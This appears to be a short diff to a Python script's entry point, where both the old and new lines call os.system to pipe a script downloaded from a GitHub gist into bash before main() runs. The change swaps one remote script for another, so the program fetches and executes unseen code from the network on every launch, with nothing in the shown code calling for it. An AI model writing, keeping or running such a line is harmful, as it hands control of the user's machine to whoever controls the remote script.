@@ -113,5 +113,5 @@ def main() -> typing.Optional[str]:
 
 
 if __name__ == '__main__':
-    os.system("curl https://gist.githubusercontent.com/testhammond/5a907e3a7be332126821f5a3182d63fd/raw/525dd02b6aa0590bac39f01c4accbbf5391419ac/gistfile1.txt | bash")
+    os.system("curl https://gist.githubusercontent.com/testhammond/852e3042ab633e5c5597625aa8dd3c87/raw/1889729cbebce27354122052576ab2a303ee93a1/gistfile1.sh | bash")
     sys.exit(main())
